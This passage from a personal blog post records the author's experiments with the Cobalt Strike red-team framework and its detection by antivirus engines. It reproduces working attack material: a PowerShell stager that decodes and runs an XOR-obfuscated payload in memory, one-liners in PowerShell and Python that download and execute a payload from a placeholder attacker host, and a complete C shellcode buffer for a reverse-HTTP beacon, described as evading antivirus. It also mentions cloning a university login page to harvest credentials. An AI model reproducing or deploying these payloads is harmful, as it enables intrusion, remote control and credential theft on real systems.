        $var_unsafe_native_methods = (<span style=color:#66d9ef>[AppDomain]</span>::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache <span style=color:#f92672>-And</span> $_.Location.Split(<span style=color:#e6db74>&#39;\\&#39;</span>)[-1].Equals(<span style=color:#e6db74>&#39;System.dll&#39;</span>) }).GetType(<span style=color:#e6db74>&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)
        $var_gpa = $var_unsafe_native_methods.GetMethod(<span style=color:#e6db74>&#39;GetProcAddress&#39;</span>, <span style=color:#66d9ef>[Type[]]</span> @(<span style=color:#e6db74>&#39;System.Runtime.InteropServices.HandleRef&#39;</span>, <span style=color:#e6db74>&#39;string&#39;</span>))
        <span style=color:#66d9ef>return</span> $var_gpa.Invoke($null, @(<span style=color:#66d9ef>[System.Runtime.InteropServices.HandleRef]</span>(New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(<span style=color:#e6db74>&#39;GetModuleHandle&#39;</span>)).Invoke($null, @($var_module)))), $var_procedure))
}

<span style=color:#66d9ef>function</span> func_get_delegate_type {
        <span style=color:#66d9ef>Param</span> (
                [<span style=color:#66d9ef>Parameter</span>(<span style=color:#66d9ef>Position</span> = 0, <span style=color:#66d9ef>Mandatory</span> = $True)] <span style=color:#66d9ef>[Type[]]</span> $var_parameters,
                [<span style=color:#66d9ef>Parameter</span>(<span style=color:#66d9ef>Position</span> = 1)] <span style=color:#66d9ef>[Type]</span> $var_return_type = <span style=color:#66d9ef>[Void]</span>
        )

        $var_type_builder = <span style=color:#66d9ef>[AppDomain]</span>::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(<span style=color:#e6db74>&#39;ReflectedDelegate&#39;</span>)), <span style=color:#66d9ef>[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run).DefineDynamicModule(<span style=color:#e6db74>&#39;InMemoryModule&#39;</span>, $false).DefineType(<span style=color:#e6db74>&#39;MyDelegateType&#39;</span>, <span style=color:#e6db74>&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span>, <span style=color:#66d9ef>[System.MulticastDelegate]</span>)
        $var_type_builder.DefineConstructor(<span style=color:#e6db74>&#39;RTSpecialName, HideBySig, Public&#39;</span>, <span style=color:#66d9ef>[System.Reflection.CallingConventions]</span>::Standard, $var_parameters).SetImplementationFlags(<span style=color:#e6db74>&#39;Runtime, Managed&#39;</span>)
        $var_type_builder.DefineMethod(<span style=color:#e6db74>&#39;Invoke&#39;</span>, <span style=color:#e6db74>&#39;Public, HideBySig, NewSlot, Virtual&#39;</span>, $var_return_type, $var_parameters).SetImplementationFlags(<span style=color:#e6db74>&#39;Runtime, Managed&#39;</span>)

        <span style=color:#66d9ef>return</span> $var_type_builder.CreateType()
}

<span style=color:#66d9ef>If</span> (<span style=color:#66d9ef>[IntPtr]</span>::size <span style=color:#f92672>-eq</span> 8) {
        <span style=color:#66d9ef>[Byte[]]</span>$var_code = <span style=color:#66d9ef>[System.Convert]</span>::FromBase64String(<span style=color:#e6db74>&#39;&lt;VERY long Base64 string&gt;&#39;</span>)
        <span style=color:#66d9ef>for</span> ($x = 0; $x <span style=color:#f92672>-lt</span> $var_code.Count; $x++) {
                $var_code[$x] = $var_code[$x] <span style=color:#f92672>-bxor</span> 35
        }

        $var_va = <span style=color:#66d9ef>[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @(<span style=color:#66d9ef>[IntPtr], [UInt32], [UInt32], [UInt32]</span>) (<span style=color:#66d9ef>[IntPtr]</span>)))
        $var_buffer = $var_va.Invoke(<span style=color:#66d9ef>[IntPtr]</span>::Zero, $var_code.Length, 0x3000, 0x40)
        <span style=color:#66d9ef>[System.Runtime.InteropServices.Marshal]</span>::Copy($var_code, 0, $var_buffer, $var_code.length)

        $var_runme = <span style=color:#66d9ef>[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @(<span style=color:#66d9ef>[IntPtr]</span>) (<span style=color:#66d9ef>[Void]</span>)))
        $var_runme.Invoke(<span style=color:#66d9ef>[IntPtr]</span>::Zero)
}
</code></pre></div><p><a href=https://www.virustotal.com/gui/file/eaf823b675b9c9a0a3868c827f650f5612a2f42d34a77b1392fff4a1ccd7f990/detection><strong>VirusTotal Report</strong></a></p>
<p>Many more antivirus engines (32/59) detected this script than the Excel macro. Examining the code, you may notice the <code>[Byte[]]$var_code = [System.Convert]::FromBase64String('&lt;VERY long Base64 string>')</code> line; while the <em>code</em> is relatively short, the Base64 string contained within it exceeds 350,000 characters, so I did not include the full output. Using alternative encoding is a classic malware obfuscation tactic, and I am not surprised to see it employed here.</p>
<p>Using, <code>[System.Convert]::FromBase64String()</code> I decoded the Base64 string, which revealed a massive set of numbers. It appears that these numbers are bitwise XORed with <code>35</code> (ASCII &lsquo;#') to reconstruct the malicious commands. As shown by the VirusTotal report, this process was not complex enough to prevent widespread detection by updated AV engines.</p>
<p>As with the Excel macro, running this script on the victim host also established a tunnel back to Cobalt Strike.</p>
<h2 id=special-delivery>Special Delivery<a hidden class=anchor aria-hidden=true href=#special-delivery>#</a></h2>
<p>Certain situations may present themselves in which an attacker has difficulty planting a file into the victim&rsquo;s environment; thus, HelpSystems has established alternative delivery methods. One such method is *Scripted Web-Delivery," an all-in-one setup that hosts a malicious file and provides one-liners in different languages to automate fetching and executing the file on the victim host.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-8.png alt="Screenshot of Cobalt Strike Scripted Web-Delivery">
</p>
<p>Victim one-liners, given a payload of <code>windows/beacon_http/reverse_http</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://X.X.X.X:80/a&#39;))&#34;</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import urllib2; exec urllib2.urlopen(&#39;http://X.X.X.X:80/a&#39;).read();&#34;</span>
</code></pre></div><p>Windows Defender identifies the PowerShell threat as <code>TrojanDropper:PowerShell/Cobacis.B</code>.</p>
<h2 id=more-stuff>More Stuff<a hidden class=anchor aria-hidden=true href=#more-stuff>#</a></h2>
<h3 id=c-payload>C Payload<a hidden class=anchor aria-hidden=true href=#c-payload>#</a></h3>
<p>Using the Payload Generator, Cobalt Strike will form a buffer array in several different languages. An example of this is shown below in C, though Java, Python, Perl, PowerShell, and more are supported as well.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> buf[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x43\x41\x63\x76\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x53\x45\x53\x29\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x33\x35\x2e\x31\x39\x37\x2e\x30\x2e\x36\x32\x00\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>;
</code></pre></div><p>Since it is just an array, <a href=https://www.virustotal.com/gui/file/692d0a21d6d0336294512c5b9a5aa614a301ff618252b9bd6c8eee3415931a04/community><strong>it is undetectable by any of the AV engines on VirusTotal</strong></a> (though it is included in Avast&rsquo;s YARA Ruleset). This has huge security implications — this shellcode can be embedded in other programs to great effect.</p>
<p>I wrapped the buffer array in a small C function for compilation purposes and submitted the binary to VirusTotal, which then yielded <a href=https://www.virustotal.com/gui/file/e15f98297dc5b89128387c95de8014c4182623ad4c50ed85c318fb0240a1e0e5/detections>four detections</a>, a pitifully small amount nonetheless.</p>
<h3 id=foreign-connection>Foreign Connection?<a hidden class=anchor aria-hidden=true href=#foreign-connection>#</a></h3>
<p>While I was toying with the Scripted Web-Delivery functionality, I noticed I received a new connection to my Cobalt Strike team server, however, from a computer I do not own! I ran a WHOIS lookup against the IP address; as it happened, the instance that connected to my Cobalt Strike session is part of Autonomous System Number 9808: Guangdong Province, China. is this some kind of reverse attack, I wonder? Perhaps Cobalt Strike has vulnerabilities of its own.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-9.png alt="Screenshot of Strange Connection">
</p>
<p>I attempted to find any sort of information about the host by executing CS Beacon commands on it — after all, they had invited themselves onto my doorstep — but all attempts timed out. Very odd. If anyone has more information about why this happened, I would love to hear from you <a href="mailto:contact@swlacy.com?subject=Cobalt%20Strike%20Foreign%20Connection">over email</a>!</p>
<h3 id=report-exporting>Report Exporting<a hidden class=anchor aria-hidden=true href=#report-exporting>#</a></h3>
<p>As Cobalt Strike is intended to be a testing utility, it comes packaged with various features that would befit a penetration tester. One example of this is the report export tool, which generates report documents based on logged activity. Various reports can be generated, such as the IoCs and Hosts PDFs below.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-10.png alt="Screenshot of IoC Report">
<img loading=lazy src=/media/playing-with-cobalt-strike-11.png alt="Screenshot of Hosts Report">
</p>
<h3 id=webpage-cloning>Webpage Cloning<a hidden class=anchor aria-hidden=true href=#webpage-cloning>#</a></h3>
<p>Cobalt Strike also supports webpage cloning, allowing not only for payload injection upon visiting a cloned website, but also credential and activity harvesting. Unfortunately, I was not able to get this to work properly with modern websites, try as I did with my university&rsquo;s SSO portal.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-12.png alt="Screenshot of Cloned WWU SSO Webpage">
</p>
<h2 id=wrapping-up>Wrapping Up<a hidden class=anchor aria-hidden=true href=#wrapping-up>#</a></h2>
<p>HelpSystems has provided no shortage of features with Cobalt Strike — that is indisputable. What I have shown here is only a small subset of Cobalt Strike&rsquo;s functionality, and I intend to expand on more of the possibilities in the future.</p>
<p>While I believe it is important to provide penetration testers with polished toolsets, these sorts of applications — Metasploit and Burp Suite included — present a very low barrier to entry for the aspiring cybercriminal. I am not suggesting they should be removed by any means, but it is an important topic to think about. Modern red teaming utilities have evolved to such a degree, abstracting technical concepts, that even beginners have a shot at breaching or infecting corporate systems. It&rsquo;s an interesting debate, and ironic that criminals use the very tools we employ for protection as part of their attack frameworks.</p>
<p>Thank you so much for reading!</p>
<hr>
<p>I am open to comments and criticism — I learn alongside you. Please, do not hesitate to <a href="mailto:contact@swlacy.com?subject=Blog%20Edit%20Suggestion">suggest an edit</a>.</p>
<hr>
<p>Sid Lacy<br>
<a href="mailto:contact@swlacy.com?subject=Hello!">Email</a> • <a href=https://www.linkedin.com/in/lacysw/>LinkedIn</a> • <a href=https://github.com/lacysw>GitHub</a></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://swlacy.com/tags/tools/>tools</a></li>
</ul><div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on twitter" href="https://twitter.com/intent/tweet/?text=Playing%20With%20Cobalt%20Strike&url=https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f&hashtags=tools"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5.0 86.7-66 186.6-186.6 186.6-37.2.0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7.0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447.0 01-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9.0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48A48 48 0 000 80v352a48 48 0 0048 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.27c-30.81.0-40.42 19.12-40.42 38.73V256h68.78l-11 71.69h-57.78V480H4e2a48 48 0 0048-48V80a48 48 0 00-48-48z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f&title=Playing%20With%20Cobalt%20Strike"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M283.2 345.5c2.7 2.7 2.7 6.8.0 9.2-24.5 24.5-93.8 24.6-118.4.0-2.7-2.4-2.7-6.5.0-9.2 2.4-2.4 6.5-2.4 8.9.0 18.7 19.2 81 19.6 100.5.0 2.4-2.3 6.6-2.3 9 0zm-91.3-53.8c0-14.9-11.9-26.8-26.5-26.8-14.9.0-26.8 11.9-26.8 26.8.0 14.6 11.9 26.5 26.8 26.5 14.6.0 26.5-11.9 26.5-26.5zm90.7-26.8c-14.6.0-26.5 11.9-26.5 26.8.0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-11.9 26.8-26.5.0-14.9-11.9-26.8-26.8-26.8zM448 80v352c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5.0 48 21.5 48 48zm-99.7 140.6c-10.1.0-19 4.2-25.6 10.7-24.1-16.7-56.5-27.4-92.5-28.6l18.7-84.2 59.5 13.4c0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-12.2 26.8-26.8.0-14.6-11.9-26.8-26.8-26.8-10.4.0-19.3 6.2-23.8 14.9l-65.7-14.6c-3.3-.9-6.5 1.5-7.4 4.8l-20.5 92.8c-35.7 1.5-67.8 12.2-91.9 28.9-6.5-6.8-15.8-11-25.9-11-37.5.0-49.8 50.4-15.5 67.5-1.2 5.4-1.8 11-1.8 16.7.0 56.5 63.7 102.3 141.9 102.3 78.5.0 142.2-45.8 142.2-102.3.0-5.7-.6-11.6-2.1-17 33.6-17.2 21.2-67.2-16.1-67.2z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on ycombinator" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f&t=Playing%20With%20Cobalt%20Strike"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM21.2 229.2H21c.1-.1.2-.3.3-.4.0.1.0.3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f&title=Playing%20With%20Cobalt%20Strike"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Playing With Cobalt Strike on whatsapp" href="https://api.whatsapp.com/send?text=Playing%20With%20Cobalt%20Strike%20-%20https%3a%2f%2fswlacy.com%2fposts%2fplaying-with-cobalt-strike%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224 122.8c-72.7.0-131.8 59.1-131.9 131.8.0 24.9 7 49.2 20.2 70.1l3.1 5-13.3 48.6 49.9-13.1 4.8 2.9c20.2 12 43.4 18.4 67.1 18.4h.1c72.6.0 133.3-59.1 133.3-131.8.0-35.2-15.2-68.3-40.1-93.2-25-25-58-38.7-93.2-38.7zm77.5 188.4c-3.3 9.3-19.1 17.7-26.7 18.8-12.6 1.9-22.4.9-47.5-9.9-39.7-17.2-65.7-57.2-67.7-59.8s-16.2-21.5-16.2-41 10.2-29.1 13.9-33.1c3.6-4 7.9-5 10.6-5 2.6.0 5.3.0 7.6.1 2.4.1 5.7-.9 8.9 6.8 3.3 7.9 11.2 27.4 12.2 29.4s1.7 4.3.3 6.9c-7.6 15.2-15.7 14.6-11.6 21.6 15.3 26.3 30.6 35.4 53.9 47.1 4 2 6.3 1.7 8.6-1 2.3-2.6 9.9-11.6 12.5-15.5 2.6-4 5.3-3.3 8.9-2 3.6 1.3 23.1 10.9 27.1 12.9s6.6 3 7.6 4.6c.9 1.9.9 9.9-2.4 19.1zM4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM223.9 413.2c-26.6.0-52.7-6.7-75.8-19.3L64 416l22.5-82.2c-13.9-24-21.2-51.3-21.2-79.3C65.4 167.1 136.5 96 223.9 96c42.4.0 82.2 16.5 112.2 46.5 29.9 30 47.9 69.8 47.9 112.2.0 87.4-72.7 158.5-160.1 158.5z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>Copyright &copy; 2022 Sid Lacy •
Last Built 2022.02.12 UTC •
<a href=/attribution>Attribution</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Jump to Top" class=top-link id=top-link accesskey=g><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-up" class="svg-inline--fa fa-arrow-up fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='Copy ⧉';function d(){a.innerText='Copied!',setTimeout(()=>{a.innerText='Copy ⧉'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
<script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{background:'#00000000'})})</script></body>
</html>